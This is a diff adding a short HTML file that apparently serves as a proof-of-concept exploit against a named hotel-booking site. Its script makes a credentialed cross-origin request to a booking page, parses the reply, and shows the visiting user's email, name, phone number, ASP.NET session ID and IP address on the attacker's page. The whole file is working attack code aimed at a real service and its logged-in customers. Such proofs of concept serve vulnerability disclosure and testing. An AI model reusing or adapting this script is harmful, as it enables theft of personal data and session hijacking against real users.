@@ -1,0 +1,21 @@
+<html>
+<div id='email'>
+</div>
+<script>
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) 
+	{
+	let parser = new DOMParser();
+	let parsedHtml = parser.parseFromString(this.response, 'text/html');
+	var data = parsedHtml.getElementsByTagName("script")[2].innerHTML;
+	split_data = data.split(";");
+	document.getElementById("email").innerHTML = "<b>Email: </b>" + parsedHtml.getElementsByTagName("input")[4].value + "</br>"+"<b>Name: </b>" + parsedHtml.getElementsByTagName("input")[2].value + parsedHtml.getElementsByTagName("input")[3].value + "</br>" + "<b>Phone: </b>" + parsedHtml.getElementsByTagName("input")[5].value + "</br></br><b>IP Address & Session ID:</b></br></br>" + "<b>ASP .NET Session ID: </b>"+ split_data[4].split("'")[1] + "</br><b>IP:</b> " + split_data[6].split("'")[1];
+	}
+};
+xhttp.open("GET", "https://bookings.luxuryretreats.com/booknow/108171/09-06-2017/09-12-2017/4/13618/(LRI)/2.0.0.0", true);
+xhttp.withCredentials = true;
+xhttp.send();
+
+</script>
+</html>
